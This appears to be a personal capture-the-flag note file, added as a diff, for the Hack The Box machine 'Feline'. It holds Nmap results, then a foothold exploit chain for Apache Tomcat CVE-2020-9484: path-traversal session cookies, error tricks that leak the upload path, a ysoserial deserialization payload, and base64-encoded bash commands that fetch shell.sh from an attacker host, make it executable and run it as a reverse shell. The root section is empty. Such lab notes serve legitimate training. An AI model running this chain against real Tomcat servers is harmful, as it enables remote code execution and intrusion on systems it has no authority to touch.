@@ -1,0 +1,72 @@
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-05 16:40 EDT
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-05 16:40 EDT
+Nmap scan report for feline.htb (10.10.10.205)
+Host is up (0.066s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  http    Apache Tomcat 9.0.27
+|_http-title: VirusBucket
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.92 seconds
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-05 16:41 EDT
+Nmap scan report for feline.htb (10.10.10.205)
+Host is up (0.049s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  http    Apache Tomcat 9.0.27
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: VirusBucket
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 144.05 seconds
+
+################################################################################
+FOOTHOLD
+################################################################################
+-8080/tcp open  http    Apache Tomcat 9.0.27
+  -https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/
+    -CVE-2020-9484
+      -https://github.com/masahiro331/CVE-2020-9484
+                    $ docker run -d -p 8080:8080 tomcat:groovy
+                    $ curl 'http://127.0.0.1:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy'
+
+                    $ docker exec -it $CONTAINER /bin/sh
+                    $ ls /tmp/rce
+        -curl 'http://feline.htb:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy'
+-Deserialization RCE to upload a file > JSESSION to call that file for reverse shell
+
+--------------------------------------------------------------------------------
+RCE to upload a file:
+--------------------------------------------------------------------------------
+ysoserial to generate payload: https://github.com/frohoff/ysoserial
+  -but where is this uploaded?
+    O-cause errors, leak info:
+      X-in the upload request, you can cause an error by putting a letter right after the multiline divider which will cause errors. This error reveals:
+      X-in the upload request, you can cause an error by putting nothing in the filename body
+      X-make a huge file BODY, error will leak:
+        X-Caused by: java.io.FileNotFoundException: /opt/tomcat/temp/upload_55567fb5_dbf0_4fd7_a0ca_d43e2188e6ed_00000128.tmp (Permission denied)
+      O-make a huge file NAME, error will leak:
+        O-java.io.FileNotFoundException: /opt/samples/uploads/aaaaaaa...
+  -load payload to /opt/samples/uploads/sploit0.session use ysoserial and CommonsCollections2
+    -java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'B64 payload' > sploit0.session
+      -call with JSESSION=../../../../../opt/samples/uploads/sploit0
+  -http://www.jackson-t.ca/runtime-exec-payloads.html to encode payloads:
+      -p0:
+        -jar file DOWNLOAD shell.sh: curl http://10.10.14.5:1339/shell.sh -o /tmp/shell.sh
+          -bash -c {echo,Y3VybCBodHRwOi8vMTAuMTAuMTQuNToxMzM5L3NoZWxsLnNoIC1vIC90bXAvc2hlbGwuc2g=}|{base64,-d}|{bash,-i}
+      -p1:
+        -jar file to execute: chmod +x /tmp/shell.sh
+          -bash -c {echo,Y2htb2QgK3ggL3RtcC9zaGVsbC5zaA==}|{base64,-d}|{bash,-i}
+      -p2:
+        -jar file to execute: bash -c /tmp/shell.sh
+          -bash -c {echo,YmFzaCAtYyAvdG1wL3NoZWxsLnNo}|{base64,-d}|{bash,-i}
+
+################################################################################
+ROOT
+################################################################################
+
